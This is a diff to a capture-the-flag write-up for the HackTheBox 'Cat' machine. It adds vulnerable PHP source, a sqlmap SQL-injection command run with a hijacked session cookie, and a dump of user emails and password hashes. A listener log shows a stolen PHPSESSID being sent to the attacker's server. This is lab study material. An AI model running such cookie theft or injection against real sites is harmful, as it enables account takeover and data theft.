@@ -172,6 +172,16 @@ Cat v1
 accept_cat.php  admin.php  config.php  contest.php  css  delete_cat.php  img  img_winners  index.php  join.php  logout.php  view_cat.php  vote.php  winners  winners.php
 ```
 
+`admin.php`
+
+```php
+// Check if the user is logged in
+if (!isset($_SESSION['username']) || $_SESSION['username'] !== 'axel') {
+    header("Location: /join.php");
+    exit();
+}
+```
+
 ```
 sudo python3 -m http.server 1717 --bind 10.10.16.59 
 ```
@@ -196,5 +206,76 @@ Priority: u=0, i
 [sudo] password for Hexada: 
 Serving HTTP on 10.10.16.59 port 1717 (http://10.10.16.59:1717/) ...
 10.10.11.53 - - [29/Apr/2025 00:30:35] code 404, message File not found
-10.10.11.53 - - [29/Apr/2025 00:30:35] "GET /cookie?c=PHPSESSID=ctsgf14n8uj3jsjgh350aai2dl HTTP/1.1" 404 -
+10.10.11.53 - - [29/Apr/2025 00:30:35] "GET /cookie?c=PHPSESSID=v5dtv2ammn19s5f96sk6q9e4jq HTTP/1.1" 404 -
 ```
+
+![image](https://github.com/user-attachments/assets/d46f378f-a908-4687-9959-9265b0723ea5)
+
+accept_cat.php
+```php
+<?php
+include 'config.php';
+session_start();
+
+if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
+    if ($_SERVER["REQUEST_METHOD"] == "POST") {
+        if (isset($_POST['catId']) && isset($_POST['catName'])) {
+            $cat_name = $_POST['catName'];
+            $catId = $_POST['catId'];
+            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
+            $pdo->exec($sql_insert);
+
+            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
+            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
+            $stmt_delete->execute();
+
+            echo "The cat has been accepted and added successfully.";
+        } else {
+            echo "Error: Cat ID or Cat Name not provided.";
+        }
+    } else {
+        header("Location: /");
+        exit();
+    }
+} else {
+    echo "Access denied.";
+}
+?>
+```
+
+SQL injection
+
+```php
+$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
+$pdo->exec($sql_insert);
+```
+
+```
+(myenv) Hexada@hexada ~/pentest-env/pentesting-tools/sqlmap$ python3 sqlmap.py -u "http://cat.htb/accept_cat.php" --data="catName=test&catId=1" --cookie="PHPSESSID=v5dtv2ammn19s5f96sk6q9e4jq" --level=5 --risk=3 --batch 
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.9.6.10#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:23:42 /2025-07-04/
+```
+
+```
++---------+--------------------------+----------------------------------+----------+
+| user_id | email                    | password                         | username |
++---------+--------------------------+----------------------------------+----------+
+| 1       | axel2017@gmail.com       | d1bbba3670feb9435c9841e46e60ee2f | axel     |
+| 2       | rosamendoza485@gmail.com | ac369922d560f17d6eeb8b2c7dec498c | rosa     |
++---------+--------------------------+----------------------------------+----------+
+```
+
+```
+Hexada@hexada ~/pentest-env/vrm/cat.htb$ cat hashes.txt
+d1bbba3670feb9435c9841e46e60ee2f
+ac369922d560f17d6eeb8b2c7dec498c
+```
+
